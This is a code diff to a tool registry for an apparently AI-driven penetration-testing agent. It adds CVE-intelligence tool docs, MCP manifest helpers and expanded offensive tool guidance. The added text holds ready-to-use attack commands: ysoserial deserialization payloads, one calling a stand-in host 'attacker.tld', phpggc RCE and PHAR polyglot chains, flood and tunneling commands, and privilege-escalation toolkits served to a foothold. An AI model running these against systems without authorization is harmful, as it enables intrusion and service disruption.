@@ -5,6 +5,19 @@ Single source of truth for tool metadata used by dynamic prompt builders.
 Dict insertion order defines tool priority (first = highest).
 """
 
+import threading
+
+# Tracks which TOOL_REGISTRY keys were injected by the most recent MCP manifest
+# load, so a subsequent load can remove them cleanly before applying the new set.
+_mcp_injected_keys: set = set()
+
+# Serialises mutations (apply / remove) so concurrent fireteam reads never
+# observe a half-mutated dict. Reads themselves don't take the lock — they
+# tolerate either pre- or post-mutation state (insertion order is preserved
+# across mutations and dict access is GIL-protected at the Python level).
+_registry_lock = threading.RLock()
+
+
 TOOL_REGISTRY = {
     "query_graph": {
         "purpose": "Neo4j database queries",
@@ -50,6 +63,48 @@ TOOL_REGISTRY = {
             '     - Flag lookup: `web_search("nuclei -rl flag", include_sources=["tool_docs"])`\n'
             '     - Critical CVEs: `web_search("Apache RCE", include_sources=["nvd"], min_cvss=9.0)`\n'
             '   - Use AFTER query_graph when you need context not in the graph.'
+        ),
+    },
+    "cve_intel": {
+        "purpose": "ProjectDiscovery vulnx CVE intelligence (NVD + KEV + EPSS + PoC + Nuclei templates)",
+        "when_to_use": "Get structured CVE data: severity, EPSS score, KEV status, PoC links, Nuclei template availability. Prefer this over web_search(nvd) when you need exploitability scoring or KEV/PoC/template flags.",
+        "args_format": '"args": "vulnx subcommand + flags without the \'vulnx\' prefix. Always pass --json --limit N; pass --fields f1,f2 to cap token usage on multi-record results."',
+        "description": (
+            '**cve_intel** (CVE intelligence -- passive PDCP query, no target traffic)\n'
+            '   - Wraps the `vulnx` CLI (successor to cvemap). Aggregates NVD + CISA KEV + EPSS + '
+            'HackerOne + public GitHub PoCs + Nuclei template availability into a single dataset '
+            '(refreshed every ~6 hours).\n'
+            '   - **Subcommands**: `id CVE-ID` (single CVE) | `search "lucene query"` (multi-CVE) | '
+            '`filters` (list all 69 searchable fields -- run this first when unsure) | '
+            '`analyze --field X` (aggregate counts) | `healthcheck`\n'
+            '   - **Output discipline**: ALWAYS pass `--json --limit N`. On multi-record `search`, '
+            'add `--fields cve_id,severity,epss_score,is_kev,is_template` to slash token usage; the '
+            'full record is huge. Other useful output flags: `--silent` (suppress banners), '
+            '`--offset N` (paginate beyond limit), `--detailed` (full record).\n'
+            '   - **Lucene operators**: combine with AND/OR/NOT, ranges (>, <, >=, <=), wildcards (*), '
+            'phrase search ("exact phrase"), grouping with parens.\n'
+            '   - **High-signal filter fields** (full list via `cve_intel("filters")`):\n'
+            '     - **Severity/score**: `severity:critical|high|medium|low`, `cvss_score:>7`, '
+            '`epss_score:>0.5`, `epss_percentile:>0.95`\n'
+            '     - **Exploitability flags**: `is_kev:true` (CISA actively-exploited), '
+            '`is_template:true` (Nuclei template exists), `is_poc:true`, `is_remote:true`, '
+            '`is_hackerone:true`\n'
+            '     - **Identity**: `cve_id:CVE-2024-21887`, `cwe:CWE-79`, `vuln_type:rce|sqli|xss|...`, '
+            '`tags:rce`\n'
+            '     - **Affected products**: `vendor:apache`, `product:confluence`, '
+            '`affected_products.vendor:microsoft`, `affected_products.product:exchange`\n'
+            '     - **Time/status**: `age_in_days:<30`, `cve_created_at:>2025-01-01`, '
+            '`vstatus:confirmed` (skip rejected/modified/unknown -- usually wanted)\n'
+            '     - **Text**: `description:"buffer overflow"`, `references:exploit-db.com`\n'
+            '   - **High-leverage queries**:\n'
+            '     - Triage one CVE: `cve_intel("id CVE-2024-21887 --json")`\n'
+            '     - Verify-now candidates: `cve_intel("search \'epss_score:>0.7 AND is_template:true AND vstatus:confirmed\' --json --fields cve_id,severity,epss_score --limit 20")`\n'
+            '     - KEV per product: `cve_intel("search \'product:confluence AND is_kev:true\' --json --limit 10")`\n'
+            '     - Discover the schema: `cve_intel("filters")` (run this when you need a filter not listed above)\n'
+            '   - **Optional PDCP API key** -- configure once in Global Settings (lifts the 10 req/min '
+            'anonymous rate limit). The key is injected silently by the executor; you never see it.\n'
+            '   - Use AFTER query_graph (when CVEs already exist on graph nodes) and BEFORE execute_nuclei '
+            '(to confirm a template exists for the CVE).'
         ),
     },
     "shodan": {
@@ -232,10 +287,24 @@ TOOL_REGISTRY = {
             'whatweb (deep tech fingerprinting: `whatweb -a 3 URL`), '
             'testssl (SSL/TLS audit: `testssl --fast URL:443`), '
             'commix (command injection: `commix -u "URL?param=test" --batch`), '
-            'sstimap (SSTI: `sstimap -u "URL?param=test"`)\n'
+            'sstimap (SSTI: `sstimap -u "URL?param=test"`, '
+            'covers Jinja2/Twig/Freemarker/Velocity/Mako/Tornado/Pebble), '
+            'tplmap (SSTI scanner that complements sstimap with Smarty + extra Velocity coverage: '
+            '`tplmap -u "http://target/page?inj=test"`, runs from /opt/tplmap in its own venv), '
+            'ysoserial (Java deserialization gadget chains: '
+            '`ysoserial URLDNS http://attacker.tld > /tmp/p.bin` blind oracle, '
+            '`ysoserial CommonsCollections6 \'id\' > /tmp/p.bin` exec; '
+            'chains: URLDNS / CommonsCollections1-7 / CommonsBeanutils1 / Spring1 / Hibernate1 / JRE8u20 / Click1), '
+            'phpggc (PHP gadget-chain generator for unserialize/PHAR: '
+            '`phpggc -l` lists chains, `phpggc Monolog/RCE1 system id` -> raw chain, '
+            '`phpggc -p phar -o /tmp/x.phar Laravel/RCE9 system id` builds PHAR with JPG polyglot; '
+            'frameworks: Laravel / Symfony / Drupal / WordPress / Magento / Monolog / Guzzle / SwiftMailer / Doctrine)\n'
             '   - **DNS:** dig (`dig axfr domain @ns`, `dig ANY domain`), nslookup, host, '
             'dnsrecon (`dnsrecon -d domain` for zone transfers, SRV, DNSSEC walk), '
-            'dnsx (fast bulk DNS: `dnsx -l /tmp/subdomains.txt -a -resp -silent`)\n'
+            'dnsx (fast bulk DNS: `dnsx -l /tmp/subdomains.txt -a -resp -silent`), '
+            'subzy (subdomain-takeover fingerprint scanner with 90+ provider signatures: '
+            '`subzy run --targets /tmp/subs.txt --concurrency 30 --hide_fails --output /tmp/subzy.json`; '
+            'sharper than httpx -td banks for unclaimed-resource detection)\n'
             '   - **Windows/AD:** smbclient (`smbclient //IP/share -U user`), sshpass (non-interactive SSH auth), '
             'enum4linux-ng (`enum4linux-ng -A target -oJ /tmp/enum4linux`), '
             'netexec/nxc (`nxc smb IP -u user -p pass --shares`, supports SMB/WinRM/LDAP/MSSQL/RDP; '
@@ -263,7 +332,10 @@ TOOL_REGISTRY = {
             '`impacket-dacledit` [WriteDACL abuse], `impacket-changepasswd`, `impacket-ntlmrelayx`)\n'
             '   - **API/GraphQL:** jwt_tool (`jwt_tool TOKEN -M at` for all tests), '
             'graphql-cop (`graphql-cop -t URL/graphql`), graphqlmap (`graphqlmap -u URL/graphql`)\n'
-            '   - **Secrets:** gitleaks (`gitleaks detect -s /path/to/repo --report-format json`)\n'
+            '   - **Secrets:** gitleaks (`gitleaks detect -s /path/to/repo --report-format json`), '
+            'semgrep (`semgrep scan --config p/default --metrics=off --json --output /tmp/semgrep.json --quiet --jobs 4 --timeout 20 /path/to/repo`; '
+            'rule packs: `p/default`, `p/owasp-top-ten`, `p/secrets`, `p/python`, `p/javascript`, `p/typescript`, `p/golang`, `p/java`; '
+            'use `--severity ERROR` for high-confidence findings only; pair with `git clone` of operator-provided repo URLs)\n'
             '   - **Passive recon:** paramspider (`paramspider -d domain`)\n'
             '   - **DoS/stress:** hping3 (`hping3 -S -p 80 --flood IP`), slowhttptest (`slowhttptest -c 1000 -u URL`)\n'
             '   - **Tunneling:** ngrok (`ngrok tcp PORT`), chisel (`chisel server -p 8080 --reverse` / `chisel client HOST:8080 R:socks`)\n'
@@ -276,10 +348,26 @@ TOOL_REGISTRY = {
             '     - `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` (~9M) -- kerbrute / user enum\n'
             '     - `/usr/share/hashcat/rules/best64.rule` -- hashcat rule set; `/usr/share/john/` for john rules\n'
             '   - **Python libs** (for one-liners via `python3 -c`): '
-            'requests, beautifulsoup4, pycryptodome, PyJWT, paramiko, impacket, pwntools\n'
+            'requests, beautifulsoup4, pycryptodome, PyJWT, paramiko, impacket, pwntools, '
+            'websockets (CSWSH/per-message auth probes), zeep (SOAP/WS-Security), '
+            'python3-saml (XSW/Comment Injection/Golden SAML), '
+            'boto3 (AWS IAM/IMDS/S3/Lambda), '
+            'msal/azure-identity/azure-mgmt-resource (Entra ID, Azure resources), '
+            'google-auth/google-api-python-client/google-cloud-storage (GCP IAM/buckets)\n'
+            '   - **Node.js** runtime available (`node`/`npm`) for prototype-pollution gadget testing '
+            'and any JS exploit POC the agent needs to run\n'
+            '   - **Post-exploit toolkits** (pre-staged for serving to the foothold or running locally):\n'
+            '     - `/opt/tools/linux/linpeas.sh`     -- PEASS-ng Linux privesc auditor\n'
+            '     - `/opt/tools/linux/LinEnum.sh`     -- rebootuser/LinEnum enumeration\n'
+            '     - `/opt/tools/linux/pspy64`         -- real-time process snooper (no root)\n'
+            '     - `/opt/tools/linux/deepce.sh`      -- Docker container-escape primitive scanner\n'
+            '     - `/opt/tools/windows/winPEASx64.exe` -- PEASS-ng Windows privesc auditor\n'
+            '     - `/opt/tools/windows/PowerUp.ps1`    -- PowerSploit privilege-escalation suite\n'
+            '     - `/opt/tools/windows/PrivescCheck.ps1` -- itm4n PrivescCheck audit\n'
+            '     - Serve via `python3 -m http.server` from /opt/tools/<os>/ then download on the foothold\n'
             '   - For multi-line scripts use **execute_code** instead (avoids shell escaping)\n'
             '   - Do NOT use kali_shell for: curl, httpx, nmap, naabu, nuclei, jsluice, subfinder, '
-            'amass, gau, katana, ffuf, arjun, masscan, wpscan, hydra, msfconsole, playwright '
+            'amass, gau, katana, ffuf, arjun, masscan, wpscan, hydra, msfconsole, playwright, vulnx '
             '-- use their dedicated tools (better timeout, output parsing, tool tracking)'
         ),
     },
@@ -303,12 +391,16 @@ TOOL_REGISTRY = {
         "args_format": '"url": "http://target:port/path", "selector": "CSS selector", "format": "text|html", "script": "Playwright Python code"',
         "description": (
             '**execute_playwright** (Browser automation -- Playwright)\n'
+            '   - **CRITICAL: Sync API only.** Your script runs inside `with sync_playwright() as p:`.\n'
+            '     Do NOT use `await`, `async def`, `import asyncio`, or `asyncio.run()` -- they will raise SyntaxError/RuntimeError.\n'
+            '     For delays use `page.wait_for_timeout(ms)` (NOT `asyncio.sleep`).\n'
             '   - **Content mode** (url): renders page with real browser, extracts text/HTML\n'
             '     Unlike curl, this executes JavaScript -- perfect for SPAs and dynamic pages\n'
             '     Optional: selector="form" to target elements, format="html" for innerHTML\n'
             '   - **Script mode** (script): run multi-step Playwright Python code\n'
             '     Pre-initialized `browser`, `context`, `page` variables. Use print() for output.\n'
-            '     Example: page.goto("url"); page.fill("#user","admin"); print(page.title())'
+            '     Example: page.goto("url"); page.fill("#user","admin"); page.click("button[type=submit]"); '
+            'page.wait_for_load_state("networkidle"); print(page.url)'
         ),
     },
     "execute_hydra": {
@@ -398,8 +490,93 @@ TOOL_REGISTRY = {
     },
 }
 
+# =========================================================================
+# Tradecraft Lookup (dynamic registry entry)
+# =========================================================================
+#
+# The tradecraft_lookup tool's description is rebuilt at runtime from the
+# user's enabled tradecraft resources (see TradecraftLookupManager.build_registry_entry).
+# `swap_tradecraft_entry()` is called from the orchestrator's
+# `_apply_project_settings()` after resources are loaded.
+#
+# When zero resources: the entry is removed via `pop_tradecraft_entry()` so the
+# agent does not see a registry entry that promises capabilities the tool
+# cannot deliver.
+
+def swap_tradecraft_entry(rich_entry: dict) -> None:
+    """Inject the dynamic per-resource catalog into TOOL_REGISTRY.
+
+    `rich_entry` must contain keys: purpose, when_to_use, args_format, description.
+    Empty dict -> remove the entry entirely.
+    """
+    if not rich_entry:
+        TOOL_REGISTRY.pop("tradecraft_lookup", None)
+        return
+    TOOL_REGISTRY["tradecraft_lookup"] = rich_entry
+
+
+def pop_tradecraft_entry() -> None:
+    TOOL_REGISTRY.pop("tradecraft_lookup", None)
+
+
+# =========================================================================
+# MCP manifest entries (user-managed servers via Settings UI)
+# =========================================================================
+#
+# `apply_mcp_manifests_to_registry` injects each declared MCP tool into
+# TOOL_REGISTRY so the prompt builders pick them up automatically. System
+# MCP servers (network_recon, nmap, nuclei, metasploit, playwright) keep
+# their existing hand-curated entries above and are NOT touched by these
+# helpers. Only user-supplied servers and their tools flow through here.
+
+def apply_mcp_manifests_to_registry(servers) -> set:
+    """
+    Replace the previously-injected MCP tool entries with the ones declared
+    by ``servers`` (a list of mcp_registry.MCPServer instances). Returns the
+    set of tool names that are now declared.
+
+    Insertion order: existing TOOL_REGISTRY entries first (built-ins +
+    system MCP wrappers), then manifest tools sorted by (server_id, tool_name)
+    so a stable manifest produces a stable prompt prefix (cache-friendly).
+    """
+    global _mcp_injected_keys
+    declared: set = set()
+
+    with _registry_lock:
+        # Drop previously-injected keys
+        for k in list(_mcp_injected_keys):
+            TOOL_REGISTRY.pop(k, None)
+        _mcp_injected_keys = set()
+
+        # Insert in deterministic order (server id, then tool name)
+        ordered = sorted(servers, key=lambda s: s.id)
+        for srv in ordered:
+            if not srv.enabled:
+                continue
+            for tool in sorted(srv.tools, key=lambda t: t.name):
+                TOOL_REGISTRY[tool.name] = {
+                    "purpose": tool.purpose,
+                    "when_to_use": tool.when_to_use,
+                    "args_format": tool.args_format,
+                    "description": tool.description,
+                }
+                _mcp_injected_keys.add(tool.name)
+                declared.add(tool.name)
+
+    return declared
+
+
+def remove_mcp_manifest_entries() -> None:
+    """Drop all MCP-injected entries (used on full reload before re-apply)."""
+    global _mcp_injected_keys
+    with _registry_lock:
+        for k in list(_mcp_injected_keys):
+            TOOL_REGISTRY.pop(k, None)
+        _mcp_injected_keys = set()
+
+
 # Simplified web_search entry used when Knowledge Base is not available
-# (--skipkbase install or missing KB dependencies). Replaces the full
+# (default install without --kbase, or missing KB dependencies). Replaces the full
 # KB-centric entry in TOOL_REGISTRY at runtime via orchestrator.py.
 WEB_SEARCH_TAVILY_ONLY = {
     "purpose": "Web search via Tavily",
